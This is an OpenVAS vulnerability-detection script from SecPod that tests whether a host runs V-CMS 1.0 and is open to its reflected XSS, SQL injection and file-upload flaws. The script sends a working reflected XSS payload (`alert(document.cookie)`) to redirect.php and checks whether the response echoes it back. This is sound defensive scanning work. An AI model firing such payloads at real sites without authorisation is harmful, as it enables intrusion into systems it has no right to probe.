###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_v-cms_mult_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# V-CMS Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site
  and to cause SQL Injection attack to gain sensitive information.
  Impact Level: Application";
tag_affected = "V-CMS version 1.0 and prior.";
tag_insight = "The flaws are due to improper validation of user-supplied input via
  the 'p' parameter to redirect.php and 'user' parameter to process.php and
  'includes/inline_image_upload.php' script, which fails to restrict non-logged
  in users to upload any files.";
tag_solution = "No solution or patch is available as of 19th, December 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://v-cms.org/";
tag_summary = "This host is running V-CMS and is prone to multiple vulnerabilities.";

if(description)
{
  script_id(902498);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4826", "CVE-2011-4827", "CVE-2011-4828");
  script_bugtraq_id(50706);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-23 12:08:49 +0530 (Fri, 23 Dec 2011)");
  script_name("V-CMS Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46861");
  script_xref(name : "URL" , value : "http://bugs.v-cms.org/view.php?id=53");
  script_xref(name : "URL" , value : "http://bugs.v-cms.org/changelog_page.php");
  script_xref(name : "URL" , value : "http://www.autosectools.com/Advisory/V-CMS-1.0-Arbitrary-Upload-236");
  script_xref(name : "URL" , value : "http://www.autosectools.com/Advisory/V-CMS-1.0-Reflected-Cross-site-Scripting-234");

  script_description(desc);
  script_summary("Check for V-CMS is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

##Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Iterate over possible paths
## Get V-CMS Installed Locatioin
foreach dir (make_list("/vcms", "/v-cms", cgi_dirs()))
{
  url = dir + "/index.php";

  ## Construct the POST request
  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: PHPSESSID=b6a966eb752adf23a35fb8b0d5f208f3\r\n\r\n");

  res = http_keepalive_send_recv(port:port, data:req);

  ## COnfirm the application
  if(">V-CMS-Powered by V-CMS" >< res)
  {
    ## Construct the attack request
    url = dir + "/redirect.php?p=%3C/script%3E%3Cscript%3Ealert(" +
                "document.cookie)%3C/script%3E%27";

    #Construct the GET request
    req = string("GET ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Cookie: PHPSESSID=b6a966eb752adf23a35fb8b0d5f208f3\r\n\r\n");

    ## Try XSS Attack
    res = http_keepalive_send_recv(port:port, data:req);

    ## Try attack and check the response to confirm vulnerability
    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
             "</script><script>alert(document.cookie)</script>" >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
